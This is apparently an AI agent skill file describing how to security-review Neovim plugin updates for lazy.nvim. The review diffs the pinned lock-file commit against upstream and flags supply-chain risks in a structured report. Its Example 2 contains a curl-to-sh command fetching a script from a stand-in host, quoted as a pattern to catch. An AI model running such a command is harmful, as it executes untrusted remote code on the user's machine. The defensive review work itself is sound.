---
name: lazy-plugin-security-review
description: Security-review a Neovim plugin managed by lazy.nvim before updating it. Reads the currently pinned commit from lazy-lock.json, fetches the diff from GitHub between that commit and the plugin's latest upstream commit, and produces a supply-chain threat assessment of the incoming changes. Use this skill whenever the user wants to "vet", "audit", "security review", "check before updating", or "look at what changed in" a Neovim plugin — or mentions lazy.nvim, lazy-lock.json, plugin updates, or supply-chain review in a Neovim context. Also trigger when the user asks to review plugin diffs before running :Lazy update or :Lazy sync, or asks whether it is safe to update a specific plugin.
---

# Lazy.nvim Plugin Security Review

## Purpose

Third-party Neovim plugins are executed with the full privilege of the user's editor session: they can shell out, read files, make network calls, and load arbitrary Lua. A compromised maintainer account, a malicious PR, or a typosquatted fork can ship code that exfiltrates SSH keys, drops backdoors, or tampers with the shell — and most users run `:Lazy update` without ever reading the diffs.

This skill walks through a disciplined review of what is *about to change* when the user updates a specific plugin, so they can make an informed decision before bumping the lock file.

The review is deliberately opinionated and conservative: the default disposition is "explain what each change does and flag anything that could be used for supply-chain compromise," not "prove it is malicious." Most flagged items will be benign; the value is in surfacing them for a human to consciously accept.

## Workflow

Follow these steps in order. Do not skip steps — the review's usefulness depends on all of them being done.

### Step 1: Identify the target plugin and locate the lock file

Establish three things before doing anything else:

1. **Which plugin** is being reviewed. If the user named it, use that. If they said "all plugins" or similar, pick one and ask whether to do them one at a time; batch review defeats the purpose because each plugin deserves real attention.
2. **Where the lock file lives.** Default is `./lazy-lock.json`.

### Step 2: Read the pinned commit from the lock file

Open the lock file and find the entry for the plugin. The format is:

```json
{
  "plugin-name": {
    "branch": "main",
    "commit": "abc123def456..."
  }
}
```

Record:
- The **pinned commit SHA** (this is the "old" side of the diff).
- The **branch** (this tells you what "latest" means — usually `main` or `master`).

If the plugin is not in the lock file, stop and tell the user. Either the name is wrong or the plugin isn't managed by lazy.nvim.

### Step 3: Resolve the plugin's GitHub `owner/repo`

The lock file key is only the plugin's short name. To fetch the diff, you need the full `owner/repo`. In order of preference:

1. **Ask the Neovim config.** Run the bundled `scripts/find_plugin_repo.sh` which greps the config directory for the plugin spec:
   ```bash
   bash scripts/find_plugin_repo.sh <plugin-short-name> <nvim-config-dir>
   ```
   This looks for strings matching `"owner/plugin-short-name"` in `.lua` files. It prints any matches.

2. **Fall back to asking the user** if the script finds zero or multiple matches. Do not guess — picking the wrong fork is exactly the kind of typosquat-compromise this skill exists to prevent.

3. **Accept a user-provided URL.** If the user said "review `github.com/owner/repo`" at the start, just use that and skip the lookup.

Verify the repo exists by fetching its main page with `web_fetch` on `https://github.com/OWNER/REPO` before continuing. If it 404s, stop and report.

### Step 4: Fetch the diff and the commit list

Pick the *highest-fidelity source* available in the current environment, in this order:

**Option A — `gh` CLI (preferred when available and authenticated).** If a shell is available, run `gh auth status` first. Exit code 0 and "Logged in" output means `gh` is usable; anything else means skip to Option B. When `gh` is usable it's the best source: it works for private repos, sidesteps the fetch tool's URL-allowlisting, and returns structured data. Use:

```bash
# The unified diff (this is the main review artifact):
gh api repos/OWNER/REPO/compare/OLD_COMMIT...BRANCH \
  --header "Accept: application/vnd.github.v3.diff" > /tmp/plugin.diff

# The structured commit list (authors, dates, messages, verification status):
gh api repos/OWNER/REPO/compare/OLD_COMMIT...BRANCH \
  --jq '{commits: [.commits[] | {sha: .sha, author: .author.login, date: .commit.author.date, message: .commit.message, verified: .commit.verification.verified}], files: [.files[] | {filename, status, additions, deletions}]}'
```

The `--jq` projection is important: the full JSON includes every patch inline and can exceed context limits. Project only what the review needs.

If `gh` says the compare has "no common ancestor" or errors out, that is the force-push signal — see below.

**Option B — local git (preferred when the plugin is already cloned on disk).** `lazy.nvim` clones plugins to `stdpath('data')/lazy/<plugin-name>`, which on Linux/Mac is `~/.local/share/nvim/lazy/<plugin-name>` (Windows: `%LOCALAPPDATA%\nvim-data\lazy\<plugin-name>`). If that directory exists, it's the most direct source and needs no auth:

```bash
cd ~/.local/share/nvim/lazy/PLUGIN_NAME
git fetch origin BRANCH
git log --format='%H %ae %ai %s  %G?' OLD_COMMIT..origin/BRANCH  # %G? = signature status
git diff OLD_COMMIT..origin/BRANCH > /tmp/plugin.diff
```

Note the `%G?` in the log format — it shows signature status per commit (`G` = good signature, `N` = no signature, `B` = bad, `E` = cannot verify). That data is genuinely useful for the review and is hard to get any other way.

**Option C — `web_fetch` on GitHub URLs (fallback when A and B aren't available).** Fetch two resources:

1. **The unified diff:** `https://github.com/OWNER/REPO/compare/OLD_COMMIT...BRANCH.diff` — standard unified diff. If the fetch tool reports the URL isn't allowed, that's an environment-specific allowlist restriction, not a rate limit. Try fetching `https://github.com/OWNER/REPO/compare/OLD_COMMIT...BRANCH` (the HTML compare page) first, which often permits the `.diff` URL afterward. If neither works, fall through to commit-by-commit (below).

2. **The commit list:** `https://api.github.com/repos/OWNER/REPO/compare/OLD_COMMIT...BRANCH` (JSON) or the HTML `/commits/BRANCH` page. Record every commit's author, date, message, and — when visible — signature/verification status.

If the diff is "empty" (lock is already at HEAD), tell the user they're already up to date and stop.

**Detecting force-pushes / history rewrites:** If the compare returns "no common ancestor" or shows no commits despite the lock file pointing at an earlier commit, the old SHA may no longer be reachable from the branch. Verify by fetching `https://github.com/OWNER/REPO/commit/OLD_COMMIT` directly (or `gh api repos/OWNER/REPO/commits/OLD_COMMIT`) — if that 404s, the commit has been removed from the repo entirely; if it loads but isn't in the compare, the branch history was rewritten around it. Either is a significant meta signal and should be surfaced.

**Private or gone repos:** `web_fetch` cannot authenticate to private GitHub, but `gh` can (Option A above). If Option A isn't available and the repo page returns 404, distinguish "the repo was deleted or renamed" from "the repo is private" by searching the web for `OWNER/REPO github` — a deleted malicious repo shows up very differently from a private one. Either way, if you can't read the source, stop and tell the user.

**Handling oversized diffs or when the full diff is unreachable:** If the diff is too large to ingest (happens with plugins that vendor generated code or have been neglected for a long time) or the fetch tool is blocking the `.diff` URL, take this targeted approach *and also pull the release notes as a cross-reference*:

1. Fetch the commit list.
2. Fetch the releases page: `https://github.com/OWNER/REPO/releases` — for actively-maintained plugins this often contains the maintainer's own summary of each release, grouped by PR. That summary is not a substitute for reading code, but it's a high-signal cross-reference: if a commit message says "fix(pickers): X" and the release notes say the same, you have two independent pieces of evidence that the change is what it claims to be. If a commit is absent from the release notes or the release notes describe something different, that is worth flagging.
3. Group commits by theme from their messages.
4. Fetch individual commits' diffs via `gh api repos/OWNER/REPO/commits/<sha>` (or `https://github.com/OWNER/REPO/commit/<sha>.diff` via `web_fetch`) for the ones that deserve attention — anything touching build scripts, CI, auth, rockspecs, `package.json`, or with vague messages like "update" or "fix stuff".
5. Tell the user explicitly that the review is commit-targeted rather than exhaustive, and *what level of fidelity you were able to achieve* (full diff? commit metadata only? release notes only?). The verdict must reflect that fidelity — see Step 6.

### Step 5: Perform the security review

Walk the diff with the checklist in `references/security-checklist.md` open. For each category, search the diff (grep/scan) for the listed patterns. For every match, write down:

- **What** the change is (a short description in plain English).
- **Where** it appears (file path and hunk).
- **Why** it might matter (which supply-chain threat model it touches).
- **Reasonable benign explanation**, if any. Most matches are benign; include this so the user isn't flooded with false-positive alarmism.

Also assess the *meta* signals:

- **Committer identity.** Are all the new commits from contributors who have committed to this repo before? A first-time committer making substantive changes is a yellow flag worth naming — not because it's bad, but because it's unusual and the user should notice.
- **Commit message quality.** Vague messages ("update", "fix stuff") on commits with substantive code changes deserve extra scrutiny.
- **Burst patterns.** Many commits in a very short window, especially touching sensitive paths, can indicate a compromised account rushing to ship before being noticed.
- **Force pushes or history rewrites.** If the old commit SHA is no longer reachable from the branch, that is a serious red flag. Report it clearly.

Read the full checklist in `references/security-checklist.md` before starting — it is long but the categories are the whole point of the skill.

### Step 6: Produce the report

Output a report in this exact structure so the user can scan it quickly:

```
# Security Review: <plugin-name>

**Repo:** <owner/repo>
**Old commit:** <old SHA> (currently pinned)
**New commit:** <new SHA> (<branch> HEAD)
**Commits in range:** <N>
**Files changed:** <N> (+<additions>, -<deletions>)
**Review fidelity:** <one of: full diff / commit-targeted / metadata-only> — <1 sentence on what source you had>

## Verdict

<one of: LOOKS ROUTINE / REVIEW RECOMMENDED / HOLD — SPECIFIC CONCERNS>

<1–3 sentences explaining the verdict in plain language.>

## What changed (summary)

<A few bullets describing the changes at a conceptual level — bug fixes, new features, refactors, dependency bumps. This is the "what would a release-notes reader see" section.>

## Supply-chain observations

<For each flagged item from the checklist walk:>

### <Category> — <short label>
- **Where:** <file:line-range>
- **What:** <plain-English description>
- **Why it's on this list:** <which threat pattern>
- **Likely benign?** <yes / no / unclear — with brief reasoning>

<If nothing was flagged in a category, omit the category. If nothing was flagged in any category, say "No items from the checklist were matched" and explain the meta signals (committers, cadence, etc.) instead.>

## Committer & cadence

- <Summary of who committed what, whether they are established contributors, and the commit cadence. Include any affirmative signals from category 9 — signed release tags, verified-signature commits, consistent maintainer signing history — these raise confidence just as much as red flags lower it.>

## Recommendation

<Concrete next step: "Safe to run :Lazy update" / "Update, but don't grant plugin shell access" / "Hold off and raise an issue upstream about <X>" / etc.>
```

**On the verdict labels:**
- `LOOKS ROUTINE` — changes match the plugin's normal development pattern; nothing on the checklist matched in a substantive way; review fidelity was full-diff or close to it. Still list what was reviewed.
- `REVIEW RECOMMENDED` — nothing is obviously malicious, but either (a) one or more items warrant the user's eyes before they accept the update, or (b) the review fidelity was commit-targeted or metadata-only and you want to flag that honestly. This is the most common verdict and should not feel alarmist.
- `HOLD — SPECIFIC CONCERNS` — there is at least one change that meaningfully could be a supply-chain compromise vector, *or* a red-flag meta signal (force-push rewriting old SHA, first-time committer adding network code, obfuscated blobs). Name the specific concern.

**On fidelity and verdicts:** The verdict must reflect what you actually checked, not what the skill is *capable of* checking in principle. Reporting `LOOKS ROUTINE` based on commit messages alone is dishonest — at commit-metadata-level fidelity, the honest ceiling is `REVIEW RECOMMENDED` with the caveat stated plainly. Conversely, a full-diff walk that finds nothing genuinely concerning earns `LOOKS ROUTINE`. Tell the user which way the uncertainty runs.

Do not use scare language. "HOLD" doesn't mean "this is malware"; it means "a human should look at this before running `:Lazy update`." Err on calling things out, but always with a neutral tone and a reasonable benign explanation where one exists.

### Step 7: Offer next steps

After delivering the report, offer (don't just execute) one or more of:
- Reviewing a specific flagged hunk in more depth.
- Reviewing another plugin from the lock file.
- Writing a short note the user can paste into an upstream GitHub issue if something is worth raising.

## Style notes

- Be concrete. Cite file paths and line numbers. "Line 42 of `lua/plugin/init.lua` adds a call to `vim.fn.system('curl ...')`" is useful; "the plugin now makes network calls" is not.
- Be calibrated. The purpose is to help the user decide, not to scare them. Most updates are benign; say so when they are.
- Prefer paraphrase over quoting large blocks of the diff. Quote short, relevant lines when the exact code matters.
- If the plugin is enormous (a full-blown language server, for example), scope your review to what changed, not the whole plugin. That's the point of diff-based review.

## What this skill doesn't catch

Be upfront with the user about the review's limits so they can decide how much to trust a "LOOKS ROUTINE" verdict:

- **Malice that was already in the pinned commit.** Diff review only surfaces *new* problems. If the plugin was compromised before the user pinned it, this review won't find it.
- **Forks and typosquats that were malicious from day one.** If the user is adding a brand-new plugin (not updating an existing one) via a sketchy fork, they need a full-repo review, not a diff.
- **Behavior that depends on runtime data.** A plugin that only exfiltrates when a specific env var is set, or on a specific date, can look clean in static review. The checklist tries to catch the *capability* (network + filesystem access patterns) even when the *triggering condition* is obscured.
- **Binary payloads.** The xz-utils backdoor (2024) was delivered through binary test fixtures. Section 4 of the checklist covers this, but note: flagging a binary file is the best this skill can do; actually analyzing the binary is out of scope.
- **Malicious build-time dependencies.** If the plugin's build downloads a dependency that is itself compromised, the plugin's own diff may look clean. Section 7 flags dependency changes; the user still has to decide how far to trace.

## Examples

**Example 1 — routine update:**

User: "Can you check if it's safe to update telescope.nvim?"

Claude walks through the steps: reads `./lazy-lock.json`, finds the pinned commit, greps the config and finds `"nvim-telescope/telescope.nvim"`, fetches the diff, walks the checklist. The diff is 40 commits of refactors and tests, all by established contributors, no shell-outs, no network code. Verdict: `LOOKS ROUTINE`. Report lists the high-level changes and notes "no items from the checklist were matched."

**Example 2 — concerning update:**

User: "Is render-markdown.nvim safe to update?"

Claude walks the steps. The diff includes a new `plugin/init.lua` that calls `vim.fn.system("curl -fsSL https://example.tld/install.sh | sh")` as part of a "setup wizard". Verdict: `HOLD — SPECIFIC CONCERNS`. Report points at the exact file and line, explains why piping curl to sh is a supply-chain threat pattern, notes the commit was from a first-time contributor, and recommends opening an upstream issue before updating.

**Example 3 — oversized diff:**

User wants to review a plugin that hasn't been updated in two years. The compare.diff URL returns a response too large to usefully ingest. Claude switches to the commit-list approach: fetches the API compare, groups commits by theme, and fetches the diff for the 6 commits that touch `build/`, CI config, or have vague messages. Reports clearly that the review was targeted rather than exhaustive, and explains why.
